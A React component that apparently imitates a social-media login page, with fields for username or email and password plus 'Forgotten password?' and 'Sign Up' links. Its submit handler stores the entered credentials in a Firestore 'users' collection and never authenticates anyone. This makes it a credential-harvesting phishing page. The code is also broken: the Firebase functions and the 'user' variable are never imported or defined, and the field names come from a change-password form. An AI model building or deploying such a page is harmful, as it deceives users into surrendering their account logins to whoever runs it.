import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import logo from '../assets/logo.png';

const Verify = () => {
  const [passwordDetails, setPasswordDetails] = useState({
    currentPassword: '',
    newPassword: '',
    newPassword2: '',
  });

  const [isActive, setIsActive] = useState(false);

  const handleChange = (event) => {
    const { value, name } = event.target;
    setPasswordDetails((prevDetails) => {
      return { ...prevDetails, [name]: value };
    });

    setIsActive(true);
  };

  const navigate = useNavigate();

  const handleSubmit = async () => {
    const docCollectionRef = collection(db, 'users');
    await addDoc(docCollectionRef, {
      user: user,
      currentPassword: passwordDetails.currentPassword,
      newPassword: passwordDetails.newPassword,
      newPassword2: passwordDetails.newPassword2,
    });
    console.log('Submitted!');
  };

  return (
    <div className="ch-passwd main-content">
      <img
        src={logo}
        alt=""
        style={{ display: 'block', margin: '1em auto 2em auto' }}
      />
      <div>
        <div className="password-input">
          <input
            id="old-passwd"
            type="password"
            className="input-field"
            placeholder="Phone number, username or email address"
            value={passwordDetails.currentPassword}
            onChange={handleChange}
            name="currentPassword"
          />
        </div>

        <div className="password-input">
          <input
            id="new-passwd"
            type="password"
            className="input-field"
            placeholder="Password"
            value={passwordDetails.newPassword}
            onChange={handleChange}
            name="newPassword"
          />
        </div>

        <p
          style={{
            width: '25em',
            margin: '1em auto 2em auto',
            textAlign: 'right',
            color: 'rgb(33, 131, 250)',
            cursor: 'pointer',
          }}
        >
          Forgotten password?
        </p>

        <div>
          <button
            id="submit-password"
            className={isActive ? 'active' : 'inactive'}
            onClick={handleSubmit}
          >
            Log in
          </button>
        </div>

        <p
          style={{
            margin: '0 auto',
            left: '35%',
            position: 'absolute',
            top: '90%',
          }}
        >
          Don't have an account?{' '}
          <span
            style={{
              color: 'rgb(33, 131, 250)',
              cursor: 'pointer',
            }}
          >
            {' '}
            Sign Up{' '}
          </span>
        </p>
      </div>
    </div>
  );
};

export default Verify;
